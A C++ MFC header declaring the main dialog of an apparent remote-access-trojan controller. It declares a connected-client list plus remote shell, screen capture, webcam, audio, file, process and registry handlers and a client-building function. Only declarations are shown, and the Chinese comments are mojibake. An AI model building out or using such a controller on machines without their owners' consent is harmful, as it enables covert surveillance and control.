
// PCRemoteDlg.h : ͷ�ļ�
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "include/IOCPServer.h"
#include "SEU_QQwry.h"	// Added by ClassView
// CPCRemoteDlg �Ի���
class CPCRemoteDlg : public CDialogEx
{
// ����
public:
	CPCRemoteDlg(CWnd* pParent = NULL);	// ��׼���캯��

// �Ի�������
	enum { IDD = IDD_PCREMOTE_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��


// ʵ��
protected:
	HICON m_hIcon;
	CStatusBar  m_wndStatusBar;              //״̬��
	CTrueColorToolBar m_ToolBar;      
	int iCount;
	NOTIFYICONDATA nid;
	SEU_QQwry *m_QQwry;
	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()

public:
	CListCtrl m_CList_Online;
	CListCtrl m_CList_Message;
	afx_msg void OnSize(UINT nType, int cx, int cy);
	// init list
	int InitList(void);
	// add to online list
	void AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,ClientContext	*pContext);
	// Show msg to  msg list
	void ShowMessage(bool bIsOK, CString strMsg);
	void Test(void);
	afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineAudio();
	afx_msg void OnOnlineCmd();
	afx_msg void OnOnlineDesktop();
	afx_msg void OnOnlineFile();
	afx_msg void OnOnlineProcess();
	afx_msg void OnOnlineServer();
	afx_msg void OnOnlineVideo();
	afx_msg void OnOnlineWindow();
	afx_msg void OnOnlineDelete();
	afx_msg void OnMainClose();
	afx_msg void OnMainAbout();
	afx_msg void OnMainBuild();
	afx_msg void OnMainSet();
	//�Զ�����Ϣ
	afx_msg void OnIconNotify(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnAddToList(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM, LPARAM);
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenManagerDialog(WPARAM /*wParam*/, LPARAM /*lParam*/);
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenWebCamDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenServerDialog(WPARAM, LPARAM);
	  afx_msg LRESULT OnOpenRegEditDialog(WPARAM, LPARAM);
	// create  status bar
	void CreatStatusBar(void);
	void CreateToolBar(void);
//	afx_msg void OnClose();
//	afx_msg void OnNotifyClose();
//	afx_msg void OnNotifyShow();
	afx_msg void OnNotifyClose();
	afx_msg void OnNotifyShow();
	afx_msg void OnClose();
protected:
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	void Activate(UINT nPort, UINT nMaxConnections);
	static void ProcessReceiveComplete(ClientContext *pContext);
public:
	void ListenPort(void);
private:
	void SendSelectCommand(PBYTE pData, UINT nSize);
public:
	afx_msg void OnOnlineRegedit();
};
